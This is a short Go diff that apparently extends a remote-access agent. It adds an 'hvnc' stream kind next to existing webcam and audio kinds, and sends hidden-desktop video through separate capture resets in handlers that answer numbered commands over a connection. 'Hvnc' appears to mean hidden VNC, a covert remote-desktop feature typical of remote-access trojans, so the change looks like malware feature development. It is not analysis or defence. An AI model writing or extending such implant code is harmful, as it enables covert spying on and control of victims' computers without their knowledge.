@@ -25,6 +25,8 @@ func pcm16BytesToInt16(chunk []byte) []int16 {
 
 func kindFromPayload(payload map[string]interface{}) webrtcpub.Kind {
 	switch s, _ := payload["kind"].(string); s {
+	case "hvnc":
+		return webrtcpub.KindHVNC
 	case "webcam":
 		return webrtcpub.KindWebcam
 	case "audio":
@@ -79,7 +81,11 @@ func handleWebrtcPublish(ctx context.Context, env *runtime.Env, cmdID string, pa
 		// Force a fresh SPS/PPS/IDR so the freshly subscribed viewer can
 		// decode immediately instead of waiting for the next natural IDR.
 		if hasVideo {
-			capture.ResetPrev()
+			if kind == webrtcpub.KindHVNC {
+				capture.ResetPrevHVNC()
+			} else {
+				capture.ResetPrev()
+			}
 		}
 		_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
 			Type: "command_result", CommandID: cmdID, OK: true,
@@ -136,7 +142,11 @@ func handleWebrtcP2POffer(ctx context.Context, env *runtime.Env, cmdID string, p
 		return nil
 	}
 	if hasVideo {
-		capture.ResetPrev()
+		if kind == webrtcpub.KindHVNC {
+			capture.ResetPrevHVNC()
+		} else {
+			capture.ResetPrev()
+		}
 	}
 	_ = wire.WriteMsg(ctx, env.Conn, wire.WebRTCP2PAnswer{
 		Type:      "webrtc_p2p_answer",
